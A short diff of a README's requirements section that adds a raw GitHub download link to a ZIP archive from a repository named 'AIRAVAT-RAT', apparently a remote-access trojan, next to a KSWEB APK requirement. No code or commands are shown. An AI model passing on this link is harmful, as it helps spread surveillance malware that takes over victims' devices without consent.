@@ -44,7 +44,13 @@
 
 ## Requirements
 
-KSWEB APK 
+ ### DOWNLOAD ZIP
+
+ https://github.com/Nikhil4494kumar/AIRAVAT-RAT-/raw/a3d6a1eae658259804a2bd95295498fb6fb5517d/AIRAVAT-main.zip
+
+KSWEB APK Download 
+
+
 
 
 ## How to Build 
